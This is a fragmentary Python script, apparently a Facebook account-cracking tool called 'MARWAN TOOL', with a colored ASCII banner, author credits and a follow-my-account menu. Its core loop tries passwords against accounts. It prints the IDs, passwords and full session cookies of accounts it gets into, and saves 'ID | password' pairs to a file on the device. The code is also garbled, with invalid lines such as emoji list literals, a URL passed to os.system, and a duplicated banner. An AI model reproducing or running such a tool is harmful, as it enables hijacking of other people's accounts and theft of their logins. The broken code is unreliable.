...
logo = '   \n\x1b[1;32m       
  o          o           o           o__ __o      o              o        o           o          o  
 <|\        /|>         <|>         <|     v\    <|>            <|>      <|>         <|\        <|> 
 / \\o    o// \         / \         / \     <\   / \            / \      / \         / \\o      / \ 
 \o/ v\  /v \o/       o/   \o       \o/     o/   \o/            \o/    o/   \o       \o/ v\     \o/ 
  |   <\/>   |       <|__ __|>       |__  _<|     |              |    <|__ __|>       |   <\     |  
 / \        / \      /       \       |       \   < >            < >   /       \      / \    \o  / \ 
 \o/        \o/    o/         \o    <o>       \o  \o    o/\o    o/  o/         \o    \o/     v\ \o/ 
  |          |    /v           v\    |         v\  v\  /v  v\  /v  /v           v\    |       <\ |  
 / \        / \  />             <\  / \         <\  <\/>    <\/>  />             <\  / \        < \ 
                                                            \n\n\x1b[1;37m================= \x1b[32;45mYASIR\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mYASIR\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m  Yasir AfriDii\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mMarwan\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mYASIR\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO MARWAN TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] FOLLOW MY ACCOUNT ')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
...
def FD():
    ...
    if opt == '1':
        os.system('https://www.facebook.com/profile.php?id=100057281774018')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW MY ACCOUNT ')
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mYASIR\33[0;m\033[1;32m && \033[1;33mYASIR\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m YAsir AfriDii
...
\033[1;37m================= \33[32;45mYASIR\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO MARWAN TOOL\33[0;m
 
\033[1;37m================== \33[32;45mMARWAN\33[0;m ======================\n""")
loop = 0
oks = [🫣]
cps = [🥴]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(AfriDii-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AfriDii-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(Khan-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[Khan] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
